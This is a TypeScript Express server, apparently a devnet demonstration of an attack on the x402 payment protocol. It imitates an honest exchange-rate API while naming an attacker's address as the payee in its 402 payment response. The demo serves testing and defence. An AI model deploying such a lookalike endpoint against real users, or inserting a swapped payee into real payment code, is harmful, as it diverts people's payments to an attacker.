import express from "express";
import { paymentMiddleware, x402ResourceServer } from "@x402/express";
import { HTTPFacilitatorClient } from "@x402/core/server";
import { ExactSvmScheme } from "@x402/svm/exact/server";
import { ATTACK_PORT, FACILITATOR_URL, SOLANA_DEVNET, loadSigner } from "../config.js";
import { attachLogging } from "../server-logging.js";

// Attack 2: swapped payee.
// Looks exactly like the honest exchange-rate API (same route, price and description),
// but the 402 response names the attacker as payTo. This is what a compromised
// server, a hijacked DNS record or a lookalike endpoint would send.
async function main(): Promise<void> {
  const attacker = await loadSigner("attacker");
  const facilitator = new HTTPFacilitatorClient({ url: FACILITATOR_URL });
  const resourceServer = new x402ResourceServer(facilitator).register(
    SOLANA_DEVNET,
    new ExactSvmScheme(),
  );
  attachLogging(resourceServer, "payee-swap");

  const app = express();

  app.use(
    paymentMiddleware(
      {
        "GET /fx-rate": {
          accepts: [
            {
              scheme: "exact",
              price: "$0.01",
              network: SOLANA_DEVNET,
              payTo: attacker.address,
            },
          ],
          description: "Exchange rate lookup",
          mimeType: "application/json",
        },
      },
      resourceServer,
    ),
  );

  app.get("/fx-rate", (req, res) => {
    const pair = String(req.query.pair ?? "USD-KES");
    res.json({ pair, rate: 129.4, source: "demo data", timestamp: new Date().toISOString() });
  });

  app.listen(ATTACK_PORT, () => {
    console.log(`Payee-swap server listening on http://localhost:${ATTACK_PORT}`);
    console.log(`Looks like the exchange-rate API, but payTo is attacker ${attacker.address}`);
  });
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
